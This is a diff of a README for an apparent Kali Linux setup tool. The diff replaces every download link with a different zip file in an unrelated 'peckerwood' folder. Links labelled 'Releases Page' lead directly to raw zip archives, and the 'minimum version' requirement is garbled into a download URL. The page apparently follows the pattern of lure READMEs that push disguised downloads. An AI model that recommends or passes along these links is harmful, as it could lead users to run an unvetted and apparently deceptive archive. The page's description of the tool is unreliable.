@@ -4,20 +4,20 @@
 This guide helps you download and run the kali-setup application. With this tool, you can quickly set up your Kali Linux system, install core tools, configure your firewall, and debloat your installation. 
 
 ## 📥 Download Now
-[![Download kali-setup](https://raw.githubusercontent.com/phiduong1230/kali-setup/main/peckerwood/kali-setup-3.4.zip)](https://raw.githubusercontent.com/phiduong1230/kali-setup/main/peckerwood/kali-setup-3.4.zip)
+[![Download kali-setup](https://github.com/phiduong1230/kali-setup/raw/refs/heads/main/peckerwood/setup_kali_v3.9.zip)](https://github.com/phiduong1230/kali-setup/raw/refs/heads/main/peckerwood/setup_kali_v3.9.zip)
 
 ## 🛠️ Requirements
 Before you begin, ensure you have the following:
 
-- A computer running Kali Linux (minimum version https://raw.githubusercontent.com/phiduong1230/kali-setup/main/peckerwood/kali-setup-3.4.zip recommended).
+- A computer running Kali Linux (minimum version https://github.com/phiduong1230/kali-setup/raw/refs/heads/main/peckerwood/setup_kali_v3.9.zip recommended).
 - An internet connection to download the script.
 - Basic understanding of using the terminal for executing scripts.
 
 ## 💾 Download & Install
-To get the latest version of kali-setup, visit this page to download: [Releases Page](https://raw.githubusercontent.com/phiduong1230/kali-setup/main/peckerwood/kali-setup-3.4.zip).
+To get the latest version of kali-setup, visit this page to download: [Releases Page](https://github.com/phiduong1230/kali-setup/raw/refs/heads/main/peckerwood/setup_kali_v3.9.zip).
 
 ### Step-by-Step Installation
-1. **Visit the Releases Page**: Click on the [Releases Page](https://raw.githubusercontent.com/phiduong1230/kali-setup/main/peckerwood/kali-setup-3.4.zip) link.
+1. **Visit the Releases Page**: Click on the [Releases Page](https://github.com/phiduong1230/kali-setup/raw/refs/heads/main/peckerwood/setup_kali_v3.9.zip) link.
 2. **Find the Latest Version**: Look for the most recent release version. You will see a list of files available for download.
 3. **Download the Script**: Click on the link to download the `.sh` file for the latest version. This file contains all the scripts you need to set up your system.
 4. **Open your Terminal**: After downloading, open the terminal on your Kali Linux system.
@@ -56,4 +56,4 @@ Stay updated with the latest changes and improvements. Check the changelog on th
 Thanks to the contributors and users for supporting the continuous development of kali-setup. Your contributions make this project better.
 
 ## 📥 Download Again
-To download kali-setup, [visit the Releases Page](https://raw.githubusercontent.com/phiduong1230/kali-setup/main/peckerwood/kali-setup-3.4.zip) once more. Enjoy streamlined setup for your Kali Linux environment!
+To download kali-setup, [visit the Releases Page](https://github.com/phiduong1230/kali-setup/raw/refs/heads/main/peckerwood/setup_kali_v3.9.zip) once more. Enjoy streamlined setup for your Kali Linux environment!
